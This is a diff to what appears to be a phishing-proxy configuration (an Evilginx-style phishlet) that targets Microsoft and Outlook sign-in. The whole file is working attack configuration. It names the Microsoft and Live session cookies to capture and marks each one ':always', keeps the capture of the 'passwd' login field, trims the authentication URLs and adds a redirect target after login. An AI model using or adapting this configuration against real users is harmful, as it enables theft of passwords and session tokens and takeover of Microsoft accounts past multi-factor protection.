@@ -163,51 +163,46 @@ auth_tokens:
   - domain: ".login.microsoftonline.com"
     keys:
       [
-        "esctx",
-        "ESTSAUTHPERSISTENT",
-        "ESTSAUTH",
-        "ch",
-        "CCState",
-        "CcsSharedSignInState",
-        "SignInStateCookie",
+        "esctx:always",
+        "ESTSAUTHPERSISTENT:always",
+        "ESTSAUTH:always",
+        "ch:always",
+        "CCState:always",
+        "CcsSharedSignInState:always",
+        "SignInStateCookie:always",
         ".*,regexp",
       ]
   - domain: "login.microsoftonline.com"
-    keys: ["ESTSAUTHLIGHT", "x-ms-gateway-slice", ".*,regexp"]
+    keys: ["ESTSAUTHLIGHT:always", "x-ms-gateway-slice:always", ".*,regexp"]
   - domain: "outlook.office365.com"
     keys:
       [
-        "DefaultAnchorMailbox",
-        "UC",
-        "OutlookSession",
-        "X-OWA-CANARY",
+        "DefaultAnchorMailbox:always",
+        "UC:always",
+        "OutlookSession:always",
+        "X-OWA-CANARY:always",
         ".*,regexp",
       ]
   - domain: ".login.live.com"
     keys:
       [
-        "MSCC",
-        "MSPPre",
-        "MSPCID",
-        "MSPOK",
-        "JSHP",
-        "JSH",
-        "SDIDC",
-        "MSPBack",
-        "uaid",
-        "MSPRequ",
-        "MSPSoftVis",
-        "OParams",
+        "MSCC:always",
+        "MSPPre:always",
+        "MSPCID:always",
+        "MSPOK:always",
+        "JSHP:always",
+        "JSH:always",
+        "SDIDC:always",
+        "MSPBack:always",
+        "uaid:always",
+        "MSPRequ:always",
+        "MSPSoftVis:always",
+        "OParams:always",
         ".*,regexp",
       ]
 
 auth_urls:
-  - "/GetCredentialType.srf"
-  - "/GetSessionState.srf"
-  - "/login.srf"
-  - "/ppsecure/post.srf"
   - "/oauth20_authorize.srf"
-  - "/authorize"
   - "/mail/"
   - "/0/"
 
@@ -220,6 +215,9 @@ credentials:
     key: "passwd"
     search: "(.*)"
     type: "post"
+
 login:
   domain: "outlook.live.com"
   path: "/owa/?nlp=1"
+
+redirect_url: "https://example.com"
